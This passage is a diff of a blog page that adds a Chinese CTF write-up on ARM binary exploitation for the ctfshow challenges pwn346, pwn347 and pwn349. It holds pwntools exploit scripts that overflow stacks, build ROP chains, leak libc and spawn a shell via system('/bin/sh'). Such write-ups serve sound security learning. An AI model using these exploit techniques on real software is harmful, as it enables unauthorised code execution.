class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = uclibc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;uclibc_base=&#x27;</span>,<span class="built_in">hex</span>(uclibc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="pwn346"><a href="#pwn346" class="headerlink" title="pwn346"></a>pwn346</h3><p>arm32栈溢出，有后门函数</p>
+<p>漏洞函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r3</span></span><br><span class="line">  _BYTE buf[<span class="number">24</span>]; <span class="comment">// [sp+4h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);<span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里发现一些小技巧</p>
+<p><strong>关于arm文件调试：</strong></p>
+<ul>
+<li>直接用exp.py脚本调试，就是用pwntools的库配合gdb来调试，这样的话就会显示出bl #read@plt 这样的看着比较清晰、舒服，而且直接gdb运程监听会进入到这个函数内部（个人感觉比较无用）</li>
+<li>arm也可以用<code>cyclic -l 字符</code>这样的方式来测试溢出长度，但还是要以实际调试的为准</li>
+</ul>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-07-17 11:01:27</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28163</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    <span class="comment">#p = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(target=(&quot;localhost&quot;, 1234), exe=elf.path,gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x0001054C</span></span><br><span class="line"><span class="comment"># b *0x00010550</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter your input:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p32(backdoor))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn347"><a href="#pwn347" class="headerlink" title="pwn347"></a>pwn347</h3><p>arm32，rop</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">le0n:pwn347/ $ checksec pwn                                                                               </span><br><span class="line">[*] <span class="string">&#x27;/home/le0n/challenge/ctfshow/pwn347/pwn&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p>漏洞依旧是栈溢出，只不过这次要进行arm32的ret2libc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ropper查询gadgets，这个pop {r3, pc};可以和下面的万能gadget配合使用</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn/ELF/ARM)&gt; search pop</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop</span><br><span class="line">                                                                                                                                                                     [INFO] File: pwn</span><br><span class="line">0x00010548: pop &#123;r11, pc&#125;;</span><br><span class="line">0x000103a4: pop &#123;r3, pc&#125;;</span><br><span class="line">0x00010500: pop &#123;r4, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;; muleq r1, r8, r8; muleq r1, r0, r8; bx lr;</span><br><span class="line">0x000104f0: popne &#123;r4, pc&#125;; bl 0x47c; mov r3, <span class="comment">#1; strb r3, [r4]; pop &#123;r4, pc&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<p>查阅一些资料发现前面一直用的csu的gadgets好像可以充当我想要的gadgets，事实也是这样csu的这段gadget被称为万能gadget。</p>
+<p>思路：</p>
+<ol>
+<li>通过puts来泄露libc基地址（备用printf），程序要导回ctfshow()函数</li>
+<li>计算system，bin&#x2F;sh</li>
+<li>再溢出来执行system</li>
+</ol>
+<p>有思路开干，因为puts和syste都只有一个函数所以试一下这段：</p>
+<p><img data-src="/../images/image-20250717155011131.png" alt="image-20250717155011131"></p>
+<p>exp(只能打通本地，远程不知道那个libc，泄露的地址也查不出来，呜~~):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_r3_pc = <span class="number">0x000103a4</span></span><br><span class="line"><span class="comment"># csu_bl = 0x0001069C</span></span><br><span class="line">mov_r0r7_blxr3 = <span class="number">0x000106ac</span></span><br><span class="line">csu_pop = <span class="number">0x000106BC</span> <span class="comment">#只需要设置R7 = 参数、R6 = 1和R3 = got</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line"><span class="comment"># payload += p32(0)*3 + p32(puts_got) #r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(printf_got) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(puts_plt) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(ctfshow)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line">puts_addr = uu32()</span><br><span class="line">leak(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">leak(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(system) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn349"><a href="#pwn349" class="headerlink" title="pwn349"></a>pwn349</h3><p>aarch64只有一个溢出还是写地址在栈上，找不到gadget</p>
+
     </div>
 
     
@@ -265,7 +622,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>Post link: </strong>
-      <a href="http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/" title="arm汇编">http://example.com/2025/07/08/arm汇编/</a>
+      <a href="http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/" title="arm基础+pwn">http://example.com/2025/07/08/arm汇编/</a>
   </li>
   <li class="post-copyright-license">
       <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -287,6 +644,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2025/07/15/libld-linux-armhf.so.3%20No%20such%20file%20or%20directory%E8%A7%A3%E5%86%B3/" rel="next" title="/lib/ld-linux-armhf.so.3: No such file or directory">
+                  /lib/ld-linux-armhf.so.3: No such file or directory <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
@@ -317,13 +677,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">355k</span>
+    <span title="Word count total">419k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">5:23</span>
+    <span title="Reading time total">6:21</span>
   </span>
 </div>
 <div class="busuanzi-count">
